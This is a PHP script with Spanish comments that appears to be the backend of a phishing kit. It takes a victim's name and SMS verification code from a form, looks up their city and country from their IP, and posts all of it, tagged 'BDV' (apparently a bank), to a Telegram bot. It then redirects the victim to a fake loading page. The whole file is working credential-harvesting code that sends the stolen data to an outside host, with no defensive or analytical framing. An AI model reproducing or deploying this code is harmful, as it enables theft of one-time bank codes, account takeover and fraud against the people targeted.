<?php
// Configuración de Telegram
require 'config.php';

// Función para obtener los detalles de la IP del usuario
function get_ip_details($ip) {
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result);
}

// Obtener la IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];
$geo = get_ip_details($ip);

// Obtener el código SMS del formulario
$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : ''; // En caso de que guardes el nombre
$ciudad = isset($geo->geoplugin_city) ? $geo->geoplugin_city : 'Desconocida';
$pais = isset($geo->geoplugin_countryName) ? $geo->geoplugin_countryName : 'Desconocido';

// Componer el mensaje para enviar a Telegram
$message = "BDV\nNombre: " . $nombre;
$message .= "\nSMS: " . $sms;
$message .= "\nCiudad: " . $ciudad . "\nPaís: " . $pais . "\nIP: " . $ip;

// Enviar el mensaje a Telegram
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
$chat_id = TELEGRAM_CHAT_ID;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'chat_id' => $chat_id,
    'text' => $message
)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirigir después de enviar los datos
header('Location: cargando2.html');
exit();
?>
